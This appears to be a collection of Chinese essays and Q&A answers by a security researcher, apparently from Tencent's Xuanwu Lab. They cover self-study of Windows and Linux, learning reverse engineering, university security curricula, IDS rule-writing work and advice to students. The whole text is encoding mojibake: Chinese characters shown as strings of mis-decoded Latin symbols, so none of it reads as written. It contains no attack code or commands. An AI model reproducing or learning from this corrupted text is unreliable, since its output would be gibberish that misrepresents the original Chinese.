ä¸‰å››å¹´å‰ï¼Œå½“æ—¶æˆ‘å¯¹äººæ€§çš„çœ‹æ³•è¿˜ä¸åƒç°åœ¨è¿™æ ·ã€‚æœ‰å‡ ä¸ªäººåŠ äº†æˆ‘çš„QQï¼Œè¯´æƒ³å­¦Windowsï¼Œæˆ‘å±…ç„¶å°±å¥½ä¸ºäººå¸ˆèµ·æ¥ï¼Œè‡ªä¸é‡åŠ›åœ°æ•™äººå­¦Windowsã€‚æˆ‘å¾ˆå¤©çœŸåœ°æŠŠè‡ªå·±çš„ç»éªŒå‘Šè¯‰ä»–ä»¬ï¼š ä¸€ã€å…ˆæŠŠWindowsçš„å¸®åŠ©æ–‡ä»¶ä»å¤´åˆ°å°¾çœ‹ä¸€éã€‚ äºŒã€åœ¨Windowsç›®å½•ä¸‹æœç´¢.txtã€.htm?ã€.logã€.iniï¼ŒæŠŠæ¯ä¸€ä¸ªæ–‡ä»¶å†…å®¹éƒ½çœ‹ä¸€éã€‚ ä¸‰ã€æŠŠæ³¨å†Œè¡¨æµè§ˆä¸€éã€‚ æ²¡æœ‰è¯€çªï¼Œä¹Ÿä¸ç”¨èŠ±é’±ä¹°ä¹¦ã€‚ä»»ä½•äººæŠŠè¿™ä¸‰æ­¥åšå®Œä¹‹åï¼Œåªè¦ä¸æ˜¯å‚»å­ï¼Œåœ¨Windowsåº”ç”¨æ–¹é¢éƒ½å¯ä»¥éå¸¸ç†Ÿç»ƒã€‚å¹¶ä¸”å¦‚æœæƒ³è¿›ä¸€æ­¥å­¦ï¼Œä¹Ÿè‡ªç„¶çŸ¥é“åº”è¯¥å»çœ‹ä»€ä¹ˆäº†ã€‚ ç»“æœç”šè‡³æ²¡æœ‰ä¸€ä¸ªäººèƒ½çœ‹å®ŒWindowså¸®åŠ©æ–‡ä»¶ï¼Œçœ‹å®Œä¸‰åˆ†ä¹‹ä¸€çš„éƒ½æ²¡æœ‰ï¼Œéƒ½è¯´çœ‹ä¸ä¸‹å»ã€‚æˆ‘å¾ˆå¥‡æ€ªï¼Œæˆ‘çœ‹Windowsçš„å¸®åŠ©æ–‡ä»¶å°±åƒçœ‹é‡‘åº¸å°è¯´ä¸€æ ·æ„‰å¿«ï¼Œæ€ä¹ˆä¼šæœ‰äººè§‰å¾—è¾›è‹¦ï¼Ÿ åæ¥æˆ‘æƒ³æ˜ç™½äº†ï¼šå› ä¸ºæˆ‘çˆ±å¥¹ï¼Œè€Œä»–ä»¬ä¸çˆ±å¥¹ï¼Œåªæ˜¯æƒ³å æœ‰å¥¹è€Œå·²ã€‚ ä»–ä»¬è¦çš„ä¸æ˜¯äº¤æµï¼Œä¸æ˜¯å¼€æ”¾ï¼Œç”šè‡³ä¹Ÿä¸æ˜¯æƒ³æ‰¾ä¸ªäººâ€œæ‹œå¸ˆâ€ï¼Œä»–ä»¬æƒ³è¦çš„ä¸æ˜¯éƒ­é–é‡åˆ°çš„æ´ªä¸ƒå…¬ï¼Œè€Œæ˜¯è™šç«¹é‡åˆ°çš„æ— æ¶¯å­ã€‚ å†åæ¥ï¼Œä¸€ä¸ªå¶ç„¶çš„æœºä¼šï¼Œæˆ‘çœ‹åˆ°äº†å°å››åŒå­¦å†™çš„é‚£ç¯‡ã€Šä½ å°½åŠ›äº†ä¹ˆï¼Ÿã€‹ï¼Œæ‰çŸ¥é“åŸæ¥è¿™ä¸åªæ˜¯æˆ‘ä¸€ä¸ªäººçš„çœ‹æ³•ã€‚ è¿™ä¸¤å¤©åœ¨å®¶ï¼Œåœ¨ç¬”è®°æœ¬ä¸ŠæŠ˜è…¾Linuxï¼Œé‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œæˆ‘å°±æŠŠå†…æ ¸æ¯ä¸€ä¸ªç¼–è¯‘é€‰é¡¹çš„è¯´æ˜éƒ½ç»†ç»†çœ‹äº†ä¸€éï¼Œåå¤ç¼–è¯‘ä¸ŠäºŒåå¤šéâ€”â€”ç„¶åï¼Œæ‰€æœ‰é—®é¢˜çš„ç­”æ¡ˆéƒ½æ‰¾åˆ°äº†ã€‚æ˜¾ç„¶ï¼Œå­¦Linuxå’Œå­¦Windowsçš„æ–¹æ³•å¹¶æ²¡æœ‰ä»€ä¹ˆä¸åŒã€‚ ä¸ºä»€ä¹ˆå¾ˆå¤šé«˜ä¸­ç”Ÿéƒ½èƒ½æ¯”å¤§å­¦ç”Ÿå¼º å‰å‡ å¤©ä¸€ä¸ªè€æœ‹å‹æ‰¾æˆ‘ï¼Œä»–éœ€è¦æ‰¾ä¸€ä¸ªæŸæ–¹å‘çš„æŠ€æœ¯åˆä½œä¼™ä¼´ã€‚è¿™ä¸ªæ–¹å‘éœ€è¦å¯¹æ“ä½œç³»ç»Ÿè¾¾åˆ°ä¸“å®¶çº§çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼Œåšèµ·æ¥å¹¶ä¸å®¹æ˜“ã€‚æˆ‘è®¤è¯†çš„èƒ½åšè¿™ä¸ªçš„äººéƒ½å·²ç»åœ¨å¤§å…¬å¸é‡Œæœ‰å¾ˆå¥½çš„èŒä½äº†ï¼Œäºæ˜¯æˆ‘ç»™ä»–ä»‹ç»äº†ä¸€ä¸ªç›¸å…³çš„å¼€æºé¡¹ç›®ã€‚ä»–è”ç³»äº†é‚£ä¸ªå¼€æºé¡¹ç›®çš„ä½œè€…ï¼Œæƒ³æ‹‰ä»–å…¥ä¼™ã€‚ç»“æœå‘ç°ä½œè€…ä»Šå¹´ä¹æœˆåˆšä¸Šå¤§ä¸€ï¼Œä»£ç æ˜¯é«˜ä¸­æ—¶å†™çš„ã€‚ ä»»ä½•é¢†åŸŸï¼Œæ˜¯å¦èƒ½å­¦æœ‰æ‰€æˆï¼Œé™¤äº†å¤©åˆ†åŸå› å¤–ï¼Œè¿˜éœ€è¦ï¼š èƒ½æ¥è§¦åˆ°æ‰€éœ€çš„å­¦ä¹ èµ„æº æŠ•å…¥äº†è¶³å¤Ÿçš„æ—¶é—´ç²¾åŠ› æ–‡ç§‘çš„å­¦ä¹ èµ„æºä¸»è¦æ˜¯ä¹¦ï¼Œç›¸å¯¹å®¹æ˜“è·å–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾ˆå¤šè‡ªå­¦æˆæ‰çš„ä½œå®¶ã€‚ä½†å¤šæ•°ç†å·¥ç§‘çš„é‡è¦å­¦ä¹ èµ„æºéƒ½ä¸å¤ªå®¹æ˜“è·å–ã€‚æ¯”å¦‚ä½ æƒ³å­¦ç”Ÿç‰©ï¼Œå°±å¾ˆéš¾åœ¨å®¶å»ºç«‹èµ·å®éªŒå®¤ã€‚ è®¡ç®—æœºé¢†åŸŸï¼ˆä¸æ­¢ä¿¡æ¯å®‰å…¨ï¼‰æ˜¯ä¸ªä¾‹å¤–ã€‚åªéœ€è¦æœ‰ä¸€å°èƒ½è”ç½‘çš„è®¡ç®—æœºï¼Œå°±å¯ä»¥å­¦å¾ˆå¤šä¸œè¥¿ã€‚é‚£ä¹ˆè¿™æ—¶å€™å°±ä¸»è¦çœ‹æ˜¯å¦æŠ•å…¥äº†è¶³å¤Ÿçš„æ—¶é—´ç²¾åŠ›ã€‚ ä½ ä»¬å¯ä»¥å›å¿†ä¸€ä¸‹è‡ªå·±çš„å¤§å­¦ç”Ÿæ¶¯ï¼Œèº«è¾¹æœ‰å¤šå°‘äººæ¯å¤©èƒ½æŠ•å…¥ 12 ä¸ªå°æ—¶åœ¨å­¦ä¹ ä¸Šï¼ŸæŠ•å…¥ 8 å°æ—¶çš„æœ‰å¤šå°‘ï¼Ÿå“ªæ€•æŠ•å…¥ 4 å°æ—¶çš„æœ‰å¤šå°‘ï¼Ÿå››å¹´ä¸‹æ¥è¯»äº†å¤šå°‘è¡Œä»£ç ï¼Ÿå†™äº†å¤šå°‘è¡Œä»£ç ï¼Ÿ æ‰€ä»¥è¢«çƒ­çˆ±æŠ€æœ¯ã€æŠ•å…¥å¾ˆå¤šæ—¶é—´å­¦ä¹ çš„é«˜ä¸­ç”Ÿè¶…è¿‡æœ‰ä»€ä¹ˆå¥‡æ€ªçš„ã€‚ æƒ³è¯»æŸä¸ªå¯¼å¸ˆçš„åšå£«åº”è¯¥å¦‚ä½•ä¸ä¹‹æ²Ÿé€š æœ‰ä¸ªå­¦ç”µå­å·¥ç¨‹çš„åŒå­¦æƒ³å»è¯»ä¸€ä¸ªç½‘ç»œå®‰å…¨æ–¹å‘å¯¼å¸ˆçš„åšå£«ï¼Œé—®æˆ‘è¯¥æ€ä¹ˆæ‰¾é‚£ä¸ªå¯¼å¸ˆè¯´ã€‚è¿™ç±»æƒ…å†µï¼Œæˆ‘å»ºè®®å…ˆæŠŠå¯¼å¸ˆå›¢é˜Ÿè¿‡å»å‡ å¹´åšçš„ä¸œè¥¿éƒ½çœ‹çœ‹ï¼Œå†æŠŠå…¶ä»–ç›¸å…³ç ”ç©¶è€…çš„å·¥ä½œä¹Ÿçœ‹çœ‹ã€‚ç„¶åå¯¹è¿™ä¸ªæ–¹å‘è¿›è¡Œä¸€äº›æ€è€ƒï¼Œäº‰å–èƒ½æœ‰ç‚¹è‡ªå·±çš„æƒ³æ³•ã€‚ç„¶åå†å»æ‰¾é‚£ä¸ªå¯¼å¸ˆèŠèŠè‡ªå·±å¯¹å®‰å…¨çš„çƒ­çˆ±ï¼Œå’Œå¯¹ç›¸å…³é¢†åŸŸçš„å­¦ä¹ å’Œç†è§£ã€‚ å­¦ä¹ ç½‘ç»œå®‰å…¨çš„æœ€ä½³è·¯çº¿æ˜¯ä»€ä¹ˆ â€œæ€ä¹ˆå­¦XXâ€è¿™æ ·çš„é—®é¢˜ï¼Œæœ‰ç‚¹ç±»ä¼¼é—®è·¯ã€‚åˆ«äººåªèƒ½ç»™ä½ æŒ‡ä¸ªæ–¹å‘ã€‚ä½†å¤šæ•°äººæƒ³è¦çš„éƒ½æ˜¯ GPSï¼Œç»™ä»–è§„åˆ’å¥½è¯¦ç»†è·¯çº¿ï¼Œåˆ°å“ªå„¿è¯¥å˜é“ï¼Œå®æ—¶è·¯å†µæ€ä¹ˆæ ·ã€‚å¤šå­¦ä¸€ç‚¹é¢å¤–çš„ä¸œè¥¿ï¼Œå°±æ„Ÿè§‰è‡ªå·±åƒäºäº†ã€‚ â€œä»è¥¿ç›´é—¨åˆ°å¤©å®‰é—¨æ€ä¹ˆèµ°ï¼Ÿâ€ â€œååœ°é“äºŒå·çº¿åˆ°å¤å…´é—¨å†è½¬ä¸€å·çº¿ã€‚â€ â€œæˆ‘çœ‹åœ°å›¾è¿™æ ·æ˜¯èµ°äº†ä¸€ä¸ªç›´è§’ï¼Œæ„Ÿè§‰ç»•è¿œäº†ã€‚æœ‰æ²¡æœ‰ç›´æ¥å»çš„è·¯ï¼Ÿâ€ â€œæœ‰å•Šï¼Œä½ é£è¿‡å»ã€‚åˆ«é£å¤ªé«˜ï¼Œä¸ç„¶èµ·é£é™è½è¦å¤šèŠ±ä¸å°‘åŠ›æ°”ã€‚â€ å¦‚ä½•æ‰èƒ½ç³»ç»Ÿåœ°å­¦ä¹ é€†å‘ æˆ‘ä¹Ÿæ˜¯å…ˆå­¦WEBåå­¦é€†å‘çš„ã€‚ä»æˆ‘çš„ç»éªŒçœ‹ï¼Œé¦–å…ˆåº”è¯¥æŠ›å¼ƒâ€œç³»ç»Ÿçš„å­¦ä¹ â€è¿™ä¸ªæƒ³æ³•ã€‚å› ä¸ºé€†å‘éœ€è¦ç”¨äººçš„è‡ªç„¶è¯­è¨€é€»è¾‘å»é€‚åº”ç¨‹åºçš„æœºå™¨æŒ‡ä»¤é€»è¾‘ï¼Œç—›è‹¦æŒ‡æ•°æ¯”è¾ƒé«˜ã€‚è¦æ‹®æŠ—è¿™ä¸ªç—›è‹¦ï¼Œéœ€è¦æŒç»­æœ‰æ­£åé¦ˆã€‚ä½†â€œç³»ç»Ÿçš„å­¦ä¹ â€ç›¸å¯¹éš¾ä»¥æŒç»­æä¾›æ­£åé¦ˆã€‚ æ‰€ä»¥æ¯”è¾ƒå¥½çš„æ–¹å¼æ˜¯ç»™è‡ªå·±æ‰¾ä¸€äº›éš¾åº¦ä¸­ç­‰ï¼Œåˆæ¯”è¾ƒæœ‰æ„æ€çš„ç›®æ ‡æ¥å…¥æ‰‹ï¼Œæ¯”å¦‚ç»™ notepad.exe çš„èœå•é‡Œå¢åŠ ä¸€ä¸ªåŠŸèƒ½ã€‚åœ¨è¿™ä¸ªå…¥æ‰‹è¿‡ç¨‹ä¸­ï¼Œå…ˆä¸ç”¨æƒ³ç³»ç»Ÿä¸ç³»ç»Ÿçš„é—®é¢˜ï¼Œæåˆ°å“ªå„¿ç®—å“ªå„¿ã€‚å…¥æ‰‹ä¹‹åï¼Œå®Œæˆäº†æœ€ç—›è‹¦çš„é‚£ä¸ªé—¨æ§›ç¿»è¶Šï¼Œåé¢å°±å’Œå­¦åˆ«çš„å·®ä¸å¤šäº†ã€‚ å¤§å­¦åŸ¹å…»è®¡åˆ’çš„é—®é¢˜ æœ€è¿‘å‡ å¹´å¸®ä¸€äº›å¤§å­¦çš„ç½‘ç»œå®‰å…¨ä¸“ä¸šè¯„å®¡è¿‡å‡ æ¬¡äººæ‰åŸ¹å…»è®¡åˆ’ï¼Œæœ¬ç¡•åšéƒ½æœ‰ã€‚æ„Ÿè§‰å­˜åœ¨ä¸€äº›å…±æ€§é—®é¢˜ã€‚ å…¶ä¸­ä¸€ä¸ªæ˜¯éƒ¨åˆ†å­¦æ ¡çš„ç½‘ç»œå®‰å…¨ä¸“ä¸šæœ¬ç§‘è¯¾ç¨‹æ²¡æœ‰æ•°ç”µå’Œæ¨¡ç”µã€‚è½¯å·¥ä¸å¼€æ•°ç”µæ¨¡ç”µä¹Ÿå°±ç®—äº†ï¼Œä½†ç½‘å®‰ä¸“ä¸šåœ¨æœªæ¥çš„å·¥ä½œä¸­å¯èƒ½éœ€è¦é¢å¯¹ä»èŠ¯ç‰‡ã€ä¿¡å·åˆ°ä»£ç ã€æ•°æ®çš„å„ç§é—®é¢˜ï¼ŒçœŸçš„è¿˜æ˜¯éœ€è¦å­¦è¿™ä¸¤é—¨è¯¾çš„ã€‚å°¤å…¶æ˜¯åœ¨å½“å‰çš„æŠ€æœ¯å‘å±•å½¢åŠ¿ä¸‹ã€‚ å½“ç„¶ï¼Œå¦‚æœæœ¬ç§‘æ²¡æœ‰è¿™ä¸¤é—¨è¯¾ï¼Œç ”ç©¶ç”Ÿé˜¶æ®µå¦‚æœæ˜¯ç¡¬ä»¶å®‰å…¨æˆ–æ— çº¿å®‰å…¨çš„æ–¹å‘ï¼Œå†æ¥å­¦è¿™ä¸¤é—¨è¯¾ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ã€‚ä½†è¿™å°±è¦æ±‚æœ¬ç¡•åŸ¹å…»è®¡åˆ’èƒ½è¡”æ¥ä¸Šã€‚è€Œä¸”æˆ‘çœ‹åˆ°ä¸€èˆ¬ç¡•å£«åŸ¹å…»è®¡åˆ’é‡Œä¼¼ä¹ä¹Ÿæ²¡æœ‰è€ƒè™‘è¿™ä¸ªé—®é¢˜ã€‚ è¡Œä¸šè§‚å¯Ÿï¼ˆç¼–è€…åŠ ï¼‰ æ¯å½“ç½‘ç»œå®‰å…¨è¡Œä¸šå‘å±•é™·å…¥åœæ»ï¼Œè¡Œä¸šé‡Œçš„ç¬¬ä¸€é˜¶çº§å°±ä¼šæ–°é€ ä¸€ä¸ªè¯ã€‚ç„¶åç¬¬äºŒé˜¶çº§æ‰“å¼€æ–‡æ¡£ï¼Œç”¨æ–°è¯è¿›è¡ŒæŸ¥æ‰¾æ›¿æ¢ã€‚ç¬¬ä¸‰é˜¶çº§åˆ™å¼€å§‹æ€è€ƒæ‹¿ä»€ä¹ˆäº§å“æ”¹ä¸€æ”¹èƒ½è´´ä¸Šè¿™ä¸ªæ–°è¯ã€‚ åœ¨é‡å¤çš„å·¥ä½œä¸­æœ‰æ‰€æ”¶è·ï¼ˆç¼–è€…åŠ ï¼‰ æˆ‘åˆšå‚åŠ å·¥ä½œçš„æ—¶å€™ï¼Œåšäº†å¾ˆé•¿ä¸€æ®µæ—¶é—´â€œä½çº§â€â€œæ— æ„ä¹‰â€çš„å·¥ä½œã€‚å°±æ˜¯ç»™ IDS åŠ ä¸€äº›é’ˆå¯¹å¤è€æ”»å‡»å·¥å…·çš„è§„åˆ™ã€‚ é‚£äº›æœ¨é©¬å’Œæ¼æ´æœ‰äº›ç”šè‡³å¤è€åˆ°è¿è¿è¡Œç¯å¢ƒéƒ½ä¸å¥½æ‰¾äº†ã€‚æ‰€ä»¥åŠ é‚£äº›è§„åˆ™å¯¹æ£€æµ‹èƒ½åŠ›æ¥è¯´ç¡®å®æ²¡æœ‰æ„ä¹‰ï¼Œæ°¸è¿œéƒ½ä¸ä¼šå‘æŒ¥ä½œç”¨ã€‚ä½†ç«äº‰å¯¹æ‰‹æœ‰è¿™ä¸ªè§„åˆ™ä½ å°±ä¹Ÿå¾—æœ‰ã€‚ä½ çœ‹ï¼Œå…¶å®è¿ç½‘ç»œå®‰å…¨äº§å“ä¹Ÿæ˜¯â€œå†…å·â€çš„ã€‚ å·¥ä½œçš„æ­¥éª¤å°±æ˜¯æœç´¢ã€ä¸‹è½½ã€è¿è¡Œã€æŠ“åŒ…ã€çœ‹ç‰¹å¾ã€å†™è§„åˆ™ã€‚ç„¶åå†é‡å¤ï¼Œå†é‡å¤ï¼Œé‡å¤å¾ˆå¤šéã€‚æœ‰æ—¶å€™ä¸ºäº†åº”ä»˜ä¸€ä¸ªæŠ•æ ‡å‰çš„æµ‹è¯„ï¼Œæ¯å¤©è¦åŠ æ¥è¿‘ä¸€ç™¾æ¡è§„åˆ™ã€‚å°±è¿™ä¹ˆé‡å¤ï¼Œå¹²åˆ°åä¸€äºŒç‚¹ã€‚ ä½†é€šè¿‡åšè¿™äº›é‡å¤çš„ã€â€œä½çº§â€çš„ã€â€œæ— æ„ä¹‰â€çš„å·¥ä½œï¼Œæˆ‘ç†Ÿæ‚‰äº†å„ç±»æ¼æ´çš„åŸç†ï¼Œå­¦ä¼šäº†å¾ˆå¤šåˆ†æå·¥å…·çš„ä½¿ç”¨ï¼Œç†Ÿæ‚‰äº†å¤§é‡é€šç”¨çš„å’Œç§æœ‰çš„ç½‘ç»œåè®®ï¼Œçœ‹åˆ°äº†å„ç§ç³»ç»Ÿå¯èƒ½å‡ºé—®é¢˜çš„åœ°æ–¹ã€‚å¦‚æœ 2002 å¹´æ²¡æœ‰åšè¿‡è¿™äº›â€œä½çº§â€â€œæ— æ„ä¹‰â€çš„å·¥ä½œï¼Œæˆ‘å¤§æ¦‚ä¹Ÿä¸ä¼šå¯¹ç½‘ç»œåè®®æœ‰é‚£ä¹ˆæ·±åˆ»çš„ç†è§£ï¼Œä¸ä¼šåœ¨ 2016 å¹´å‘ç° BadTunnel æ¼æ´ã€‚ å½“ç„¶ï¼Œå¦‚æœåªæ˜¯æœºæ¢°åœ°å»é‡å¤å·¥ä½œè¿‡ç¨‹ï¼Œè€Œä¸åœ¨å·¥ä½œä¸­å­¦ä¹ å’Œæ€è€ƒï¼Œé‚£ä¸ç®¡åšä»€ä¹ˆå·¥ä½œï¼Œéƒ½ä¸ä¼šæœ‰é•¿è¿›ã€‚å¯¹è¿™ç±»äººæ¥è¯´ï¼Œå·¥ä½œç¡®å®åªæ˜¯æ¶ˆè€—è¿‡ç¨‹ï¼Œè€Œä¸èƒ½æˆä¸ºå¢ç›Šè¿‡ç¨‹ã€‚ ä¸€ä¸ªå¥³ç”Ÿæ€æ ·æ‰èƒ½è¿›å…¥è…¾è®¯çš„ç„æ­¦å®éªŒå®¤ï¼Ÿ ã€æœ¬äººæ˜¯ä¸€ä½çƒ­çˆ±ç½‘ç»œå®‰å…¨æŠ€æœ¯çš„å¥³ç”Ÿï¼Œå¤§äºŒå¼€å§‹æ¥è§¦ç½‘ç»œå®‰å…¨ï¼Œå› ä¸ºçƒ­çˆ±ï¼Œå¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨è‡ªå­¦ç½‘ç»œå®‰å…¨æ–¹é¢çš„çŸ¥è¯†æŠ€èƒ½ï¼Œæœ‰å­¦ä¹ ä¸»åŠ¨ä¿¡æ¯æ”¶é›†ï¼Œè¢«åŠ¨ä¿¡æ¯æ”¶é›†ï¼Œæ— çº¿æ”»å‡»ï¼Œå¯†ç ç ´è§£ï¼Œwebæ¸—é€,metasploit,linuxç­‰æ¸—é€æµ‹è¯•æ‰€éœ€æŠ€èƒ½ï¼Œæ­£å­¦ä¹ pythonã€‚ä¸æ–­åœ°å­¦ä¹ ä¸­å‘ç°ï¼Œå¯èƒ½å› ä¸ºç½‘ç»œå®‰å…¨æ¶‰åŠé¢è¾ƒå¹¿ï¼Œæ‰€ä»¥éœ€è¦æŒæ¡çš„çŸ¥è¯†è¾ƒå¤šä½†ä¸æ·±ï¼Œè€Œå¿ƒä¸­æœ‰å¤§ç‰›çš„ç›®æ ‡ï¼Œå‘å¾€ç„æ­¦è¿™ç§é¡¶çº§çš„å›½å†…å®‰å…¨ç ”ç©¶å®éªŒå®¤ï¼ŒæŸ¥çœ‹å„ç§èµ„æ–™å‘ç°ç„æ­¦å¯¹æŠ€æœ¯çš„è¦æ±‚éå¸¸ä¸“ä¸€ä¸”æ·±å…¥ï¼Œå†åŠ ä¸Šç„æ­¦å¥½åƒåªæœ‰ä¸€ä½å¥³ç”Ÿï¼Œæœ‰äº›è¿·èŒ«ä¸çŸ¥æœå“ªä¸ªæ–¹å‘åŠªåŠ›ï¼Œæ‰èƒ½ç¦»ç„æ­¦æ›´è¿‘ä¸€æ­¥ã€‚ã€ å¾ˆå¤šäººä»¥ä¸ºæˆ‘æ˜¯ä¸“é—¨ç ”ç©¶äºŒè¿›åˆ¶å®‰å…¨çš„ï¼Œæ‰€ä»¥åå‘äºŒè¿›åˆ¶æ–¹å‘ã€‚å…¶å®å»å¹´å‘ç°çš„ BadTunnel å°±ä¸å±äºäºŒè¿›åˆ¶æ–¹å‘ï¼šã€ŠBadTunnelï¼šè·¨ç½‘æ®µåŠ«æŒå¹¿æ’­åè®®ã€‹BadTunnelï¼šè·¨ç½‘æ®µåŠ«æŒå¹¿æ’­åè®®ã€‚ä½ ä¸Šé¢æåˆ°çš„ä¸œè¥¿ï¼Œæˆ‘åŸºæœ¬ä¹Ÿéƒ½æè¿‡ã€‚ è¿™æ˜¯å¾ˆæ—©ä»¥å‰ä¸€ä»½ç®€å†é‡Œçš„å†…å®¹ï¼š 2002å¹´1æœˆï¼Œå‘ç°äº†CheckPoint MetaInfo Sendmailç®¡ç†æ¥å£æ‰§è¡Œå‘½ä»¤æ¼æ´ã€‚ 2002å¹´1æœˆï¼Œå‘ç°äº†Snitz Forums 2000 Version 3.1 SR4çš„ç®¡ç†ç•Œé¢è®¤è¯ç»•è¿‡æ¼æ´ã€‚ 2002å¹´4æœˆï¼Œå’Œä¸€ä¸ªæœ‹å‹å…±åŒå‘ç°äº†PhpBBç­‰å¤šä¸ªè®ºå›ç¨‹åºçš„BBCodeå‡½æ•°æ‹’ç»æœåŠ¡æ¼æ´ï¼ˆbugtraq ID 4432ã€4434ï¼‰ å‰å‡ å¹´ç ”ç©¶æµè§ˆå™¨çš„äºŒè¿›åˆ¶æ¼æ´æ—¶ä¹ŸåŒæ—¶ç ”ç©¶è¿‡ Web å‰ç«¯ç›¸å…³çš„é—®é¢˜ï¼šã€Šæµè§ˆå™¨å’Œæœ¬åœ°åŸŸã€‹ç½‘é¡µé“¾æ¥ ä½ è¯´çš„æ— çº¿æ”»å‡»æˆ‘ä¹Ÿç ”ç©¶è¿‡ï¼šã€Šæ¥è‡ªç©ºä¸­çš„å¨èƒã€‹ç½‘é¡µé“¾æ¥ æ¸—é€æµ‹è¯•åšçš„å°±æ›´å¤šäº†ã€‚ä»¥å‰åœ¨ä¹™æ–¹å…¬å¸ï¼Œæˆ‘æ˜¯æ¸—é€æµ‹è¯•ä¸»åŠ›ã€‚è¿˜è®°å¾—æœ€å¿™çš„ä¸€ä¸ªé¡¹ç›®ï¼Œæˆ‘å’Œéƒ¨é—¨é¢†å¯¼ä¸€èµ·ï¼Œä¸¤ä¸ªæœˆåšäº† 184 å°æœåŠ¡å™¨çš„æ¸—é€æµ‹è¯•ã€‚ æ‰€ä»¥æˆ‘å¯èƒ½æ˜¯æœ€ä¸ä¼šå¯¹å„ç±»å®‰å…¨æŠ€æœ¯æœ‰åè§çš„äººã€‚ æ— è®ºå“ªç±»æŠ€æœ¯ï¼ŒèƒŒåçš„éœ€è¦çš„ä¸œè¥¿éƒ½æ˜¯ç±»ä¼¼çš„ã€‚AFL è¿™ä¸ªé©å‘½æ€§çš„äºŒè¿›åˆ¶æ¼æ´ Fuzz å·¥å…·çš„ä½œè€…ï¼Œä¹Ÿæ˜¯ã€ŠThe Tangled Web: A Guide to Securing Modern Web Applicationsã€‹è¿™æœ¬ Web å®‰å…¨åœ£ç»çš„ä½œè€…ã€‚ æˆ‘ä»¬å®éªŒå®¤æœ‰å‡ ä¸ªåš Windows æ–¹å‘çš„åŒå­¦ï¼Œ æ¯•ä¸šå‰éƒ½æ²¡æ¥è§¦è¿‡ Windows å®‰å…¨ã€‚ä½†åœ¨å®éªŒå®¤å·¥ä½œåŠå¹´åï¼Œå°±å¼€å§‹èƒ½åšå‡ºä¸€äº›æˆæœã€‚ä¸€å¹´å¤šä¹‹åï¼Œå°±å·²ç»èƒ½åšå‡ºå¾ˆä¸é”™çš„ä¸œè¥¿ã€‚å½“ç„¶ï¼Œè¿™å¹¶ä¸æ„å‘³ç€å¹²è¿™è¡Œå¾ˆå®¹æ˜“ï¼Œäººäººå¯ä¸ºã€‚è¿™å‡ ä½åŒå­¦è™½ç„¶ä¹‹å‰æ²¡æ¥è§¦è¿‡ Windows å®‰å…¨ï¼Œä½†åœ¨æ ¡æœŸé—´ï¼Œåœ¨å…¶å®ƒæ–¹å‘ä¸Šéƒ½åšå‡ºäº†ä¸€äº›ä¸œè¥¿ã€‚æˆ‘è®°å¾—å…¶ä¸­ä¸€ä¸ªåŒå­¦ï¼Œæ¯•ä¸šå‰ç¡¬å•ƒäº†å‡ ä¸ªæœˆ Apache æºç ï¼Œå‘ç°äº†ä¸€ä¸ªæ¼æ´ã€‚åœ¨ Apache é‡Œè¿˜èƒ½æå‡ºä¸œè¥¿æ¥ï¼Œæ˜¯ä¸å®¹æ˜“çš„ã€‚ å·¥ä½œå¹¶ä¸æ„å‘³ç€å­¦ä¹ çš„ç»“æŸï¼Œè€Œæ˜¯å¦ä¸€ä¸ªå¼€å§‹ã€‚æˆ‘ä»¬å¤§å¤šæ•°äººè‡³å°‘éƒ½è¦å·¥ä½œä¸‰åå¹´ï¼Œè¿™ä¸‰åå¹´é‡Œè¿˜ä¼šæœ‰å¾ˆå¤šä¸œè¥¿è¦å­¦ã€‚æ‰€ä»¥ä¸ç”¨å¤ªåœ¨æ„ä¹‹å‰å­¦äº†ä»€ä¹ˆï¼Œæ›´é‡è¦çš„æ˜¯çœ‹ä½ è¿˜èƒ½å­¦ä¼šä»€ä¹ˆã€‚æ— è®ºä¹‹å‰å­¦è¿‡ä»€ä¹ˆï¼Œå°†æ¥éƒ½è¦å†å­¦æ–°ä¸œè¥¿ã€‚æ— è®ºä¹‹å‰å­¦çš„æ˜¯ä»€ä¹ˆï¼Œå°†æ¥ä¹Ÿéƒ½ä¼šæœ‰ç”¨ã€‚è‰ºæ— æ­¢å¢ƒï¼ŒåŠŸä¸å”æã€‚ ç­”ä¸€ä½çƒ­çˆ±ç½‘ç»œå®‰å…¨çš„åŒå­¦çš„æ¥ä¿¡ è°¢è°¢å¯¹ç„æ­¦å®éªŒå®¤çš„å…³æ³¨å’Œå¯¹æˆ‘çš„ä¿¡ä»»ã€‚ å®éªŒå®¤å¯¹å®ä¹ åŒå­¦çš„è¦æ±‚ï¼Œå…¶å®ä¸»è¦å°±ä¸¤ç‚¹ï¼š å¯¹ä¿¡æ¯å®‰å…¨æœ‰æ¯”è¾ƒæ•´ä½“çš„è®¤è¯†ï¼› è‡³å°‘é’»ç ”è¿‡ä¸€ä¸¤é¡¹å·¥ä¸šç•Œçš„æŠ€æœ¯ï¼Œæœ‰æ·±å…¥çš„äº†è§£å’Œä¸€å®šçš„æˆæœã€‚ è¯»äº†æ¥ä¿¡ï¼Œæˆ‘æ„Ÿè§‰ä½ æ˜¯ä¸€ä¸ªå‹¤å¥‹å¥½å­¦çš„äººï¼Œè¿™å¾ˆéš¾å¾—ã€‚å¤§å­¦æ—¶ä»£æ˜¯æœ€é€‚åˆå­¦ä¹ çš„æ—¶å€™â€”â€”è¿™å¬èµ·æ¥æœ‰ç‚¹åƒåºŸè¯ï¼Œä½†åœ¨è¿™æ®µæ—¶é—´é‡Œï¼Œä½ æœ‰å¾ˆå¤šæ—¶é—´ï¼Œè€Œæ²¡æœ‰ç”Ÿå­˜å‹åŠ›ï¼Œä½ çš„è®°å¿†åŠ›å¤„äºä¸€ç”Ÿä¸­çš„å·…å³°çŠ¶æ€ï¼Œä½ å³ä½¿ä¸€å¤œä¸ç¡ä¹Ÿå¯ä»¥å¾ˆå¿«æ¢å¤ç²¾åŠ›ã€‚æ¯•ä¸šåå¯èƒ½å†ä¹Ÿä¸ä¼šæœ‰åŒæ—¶å…·å¤‡è¿™äº›æ¡ä»¶çš„æ—¶é—´äº†ã€‚ æœ‰äº†å‹¤å¥‹ï¼Œæ¥ä¸‹æ¥ä¸»è¦æ˜¯åœ¨ä»€ä¹ˆæ–¹å‘ä¸Šå‹¤å¥‹çš„é—®é¢˜ã€‚ 